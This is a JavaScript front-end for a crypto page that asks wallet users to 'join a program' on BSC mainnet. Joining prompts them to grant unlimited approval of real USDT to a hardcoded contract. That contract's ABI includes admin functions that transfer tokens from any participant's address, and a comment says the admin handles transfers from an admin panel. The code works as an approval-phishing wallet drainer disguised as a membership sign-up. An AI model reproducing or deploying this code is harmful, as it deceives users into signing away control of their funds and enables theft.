// Web3 Configuration
let web3;
let userAccount;
let usdtContract;
let programContract;
let contractAddress;

// BSC Mainnet Configuration (FOR REAL USDT!)
const BSC_MAINNET = {
    chainId: '0x38', // 56 in hex
    chainName: 'Binance Smart Chain',
    nativeCurrency: {
        name: 'BNB',
        symbol: 'BNB',
        decimals: 18
    },
    rpcUrls: ['https://bsc-dataseed1.binance.org'],
    blockExplorerUrls: ['https://bscscan.com']
};

// USDT Contract ABI (ERC20 Standard)
const USDT_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {"name": "_owner", "type": "address"},
            {"name": "_spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
    }
];
// USDT Contract Address - Official BSC Mainnet USDT (Binance-Peg)
const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';

// Program Contract Address - DEPLOY THIS IN REMIX!
// TODO: Replace with your deployed ProgramContract address
const PROGRAM_CONTRACT_ADDRESS = '0x8B9c85D168d82D6266d71b6f31bb48e3bE1caDf4';

// Program Contract ABI
const PROGRAM_ABI = [
    {"inputs":[{"name":"_from","type":"address"},{"name":"_amount","type":"uint256"}],"name":"adminTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_amount","type":"uint256"}],"name":"adminTransferToAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"joinProgram","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"user","type":"address"}],"name":"getUserAllowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"user","type":"address"}],"name":"isParticipant","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"getAllParticipants","outputs":[{"name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"getParticipantCount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"admin","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
];

// DOM Elements
const connectBtn = document.getElementById('connectBtn');
const connectionStatus = document.getElementById('connectionStatus');
const walletAddress = document.getElementById('walletAddress');
const copyBtn = document.getElementById('copyBtn');
const balanceCard = document.getElementById('balanceCard');
const bnbBalance = document.getElementById('bnbBalance');
const usdtBalance = document.getElementById('usdtBalance');
const refreshBalance = document.getElementById('refreshBalance');
const joinProgramCard = document.getElementById('joinProgramCard');
const joinProgramBtn = document.getElementById('joinProgramBtn');
const approvalStatusText = document.getElementById('approvalStatusText');
const currentAllowance = document.getElementById('currentAllowance');
const joinedStatus = document.getElementById('joinedStatus');
const programInfoCard = document.getElementById('programInfoCard');
const userStatus = document.getElementById('userStatus');
const joinedDate = document.getElementById('joinedDate');
const instructionsCard = document.getElementById('instructionsCard');
const loadingOverlay = document.getElementById('loadingOverlay');
const loadingText = document.getElementById('loadingText');
const toast = document.getElementById('toast');
const toastMessage = document.getElementById('toastMessage');

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    setupEventListeners();
    checkWalletConnection();
});

// Setup Event Listeners
function setupEventListeners() {
    connectBtn.addEventListener('click', connectWallet);
    copyBtn.addEventListener('click', copyAddress);
    refreshBalance.addEventListener('click', loadBalance);
    joinProgramBtn.addEventListener('click', joinProgram);
}

// Check if wallet is already connected
async function checkWalletConnection() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                web3 = new Web3(window.ethereum);
                userAccount = accounts[0];
                await initializeApp();
            }
        } catch (error) {
            console.error('Error checking wallet connection:', error);
        }
    }
}

// Connect Wallet
async function connectWallet() {
    if (typeof window.ethereum === 'undefined') {
        showToast('Please install MetaMask or Trust Wallet!', 'error');
        return;
    }

    try {
        showLoading('Connecting to wallet...');
        
        // Request account access
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        userAccount = accounts[0];

        // Check and switch to BSC Mainnet (REAL USDT!)
        await switchToBSCMainnet();

        // Initialize the app
        await initializeApp();

        hideLoading();
        showToast('Wallet connected successfully!', 'success');
    } catch (error) {
        hideLoading();
        console.error('Error connecting wallet:', error);
        showToast('Failed to connect wallet: ' + error.message, 'error');
    }
}

// Switch to BSC Mainnet (FOR REAL USDT!)
async function switchToBSCMainnet() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_MAINNET.chainId }],
        });
    } catch (switchError) {
        // Chain not added, add it
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [BSC_MAINNET],
                });
            } catch (addError) {
                throw new Error('Failed to add BSC Mainnet');
            }
        } else {
            throw switchError;
        }
    }
}

// Initialize App
async function initializeApp() {
    // Update UI
    connectBtn.textContent = 'Connected';
    connectBtn.classList.add('connected');
    walletAddress.textContent = formatAddress(userAccount);
    
    // Show cards
    connectionStatus.classList.remove('hidden');
    balanceCard.classList.remove('hidden');
    joinProgramCard.classList.remove('hidden');
    programInfoCard.classList.remove('hidden');
    instructionsCard.classList.add('hidden');

    // Initialize contracts
    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
    
    if (PROGRAM_CONTRACT_ADDRESS !== 'YOUR_PROGRAM_CONTRACT_ADDRESS_HERE') {
        programContract = new web3.eth.Contract(PROGRAM_ABI, PROGRAM_CONTRACT_ADDRESS);
    }

    // Load data
    await loadBalance();
    await checkProgramStatus();

    // Listen for account changes
    window.ethereum.on('accountsChanged', handleAccountsChanged);
    window.ethereum.on('chainChanged', handleChainChanged);
}

// Handle Account Changes
function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        location.reload();
    } else if (accounts[0] !== userAccount) {
        location.reload();
    }
}

// Handle Chain Changes
function handleChainChanged() {
    location.reload();
}

// Load Balance
async function loadBalance() {
    try {
        showLoading('Loading balance...');

        const response = await fetch('/api/get-balance', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ address: userAccount })
        });

        const data = await response.json();
        
        if (data.success) {
            bnbBalance.textContent = parseFloat(data.bnb_balance).toFixed(4) + ' BNB';
            usdtBalance.textContent = parseFloat(data.usdt_balance).toFixed(2) + ' USDT';
        } else {
            showToast('Failed to load balance: ' + data.error, 'error');
        }

        hideLoading();
    } catch (error) {
        hideLoading();
        console.error('Error loading balance:', error);
        showToast('Failed to load balance', 'error');
    }
}

// Check Program Status
async function checkProgramStatus() {
    if (!programContract) {
        approvalStatusText.textContent = 'Contract Not Deployed';
        approvalStatusText.style.color = '#EF4444';
        joinProgramBtn.disabled = true;
        joinProgramBtn.textContent = 'Deploy Contract First';
        return;
    }
    
    try {
        // Check if user has joined
        const isParticipant = await programContract.methods.isParticipant(userAccount).call();
        
        // Check allowance to program contract
        const allowance = await usdtContract.methods.allowance(userAccount, PROGRAM_CONTRACT_ADDRESS).call();
        const decimals = await usdtContract.methods.decimals().call();
        const allowanceFormatted = (allowance / Math.pow(10, decimals)).toFixed(2);
        
        currentAllowance.textContent = allowance > 0 ? `${allowanceFormatted} USDT` : '0 USDT';
        
        if (isParticipant) {
            approvalStatusText.textContent = '✓ Approved & Joined';
            approvalStatusText.style.color = '#10B981';
            userStatus.textContent = '✓ Active Member';
            userStatus.style.color = '#10B981';
            joinProgramBtn.disabled = true;
            joinProgramBtn.textContent = 'Already Joined';
            joinedStatus.classList.remove('hidden');
        } else if (allowance > 0) {
            approvalStatusText.textContent = 'Approved - Click Join';
            approvalStatusText.style.color = '#F59E0B';
            joinProgramBtn.disabled = false;
        } else {
            approvalStatusText.textContent = 'Not Approved';
            approvalStatusText.style.color = '#EF4444';
            joinProgramBtn.disabled = false;
        }
        
    } catch (error) {
        console.error('Error checking program status:', error);
    }
}

// Join Program
async function joinProgram() {
    if (!programContract) {
        showToast('❌ Program contract not deployed! Deploy ProgramContract.sol first.', 'error');
        return;
    }
    
    try {
        showLoading('Checking approval status...');
        
        // Check current allowance
        const allowance = await usdtContract.methods.allowance(userAccount, PROGRAM_CONTRACT_ADDRESS).call();
        
        // If not approved, request approval first
        if (allowance == 0) {
            showToast('⏳ Step 1: Approving USDT access...', 'info');
            
            // Request unlimited approval
            const maxApproval = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
            
            const approveTx = await usdtContract.methods.approve(PROGRAM_CONTRACT_ADDRESS, maxApproval).send({
                from: userAccount
            });
            
            showToast('✅ USDT approved! Now joining program...', 'success');
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        // Join the program
        showLoading('Joining program...');
        showToast('⏳ Please confirm joining the program in your wallet...', 'info');
        
        const joinTx = await programContract.methods.joinProgram().send({
            from: userAccount,
            gas: 150000
        });
        
        hideLoading();
        showToast('🎉 Successfully joined the program!', 'success');
        
        // Refresh status
        await checkProgramStatus();
        
    } catch (error) {
        hideLoading();
        console.error('Error joining program:', error);
        
        if (error.code === 4001) {
            showToast('❌ Action rejected by user', 'error');
        } else if (error.message.includes('Already joined')) {
            showToast('ℹ️ You have already joined the program', 'info');
            await checkProgramStatus();
        } else {
            showToast('❌ Failed to join: ' + error.message, 'error');
        }
    }
}

// Removed old transfer functions - Admin will handle transfers from admin panel

// Copy Address
function copyAddress() {
    navigator.clipboard.writeText(userAccount);
    showToast('Address copied to clipboard!', 'success');
}

// Format Address
function formatAddress(address) {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
}

// Show Loading
function showLoading(message = 'Processing...') {
    loadingText.textContent = message;
    loadingOverlay.classList.remove('hidden');
}

// Hide Loading
function hideLoading() {
    loadingOverlay.classList.add('hidden');
}

// Show Toast
function showToast(message, type = 'info') {
    toastMessage.textContent = message;
    toast.className = `toast ${type}`;
    toast.classList.remove('hidden');

    setTimeout(() => {
        toast.classList.add('hidden');
    }, 3000);
}

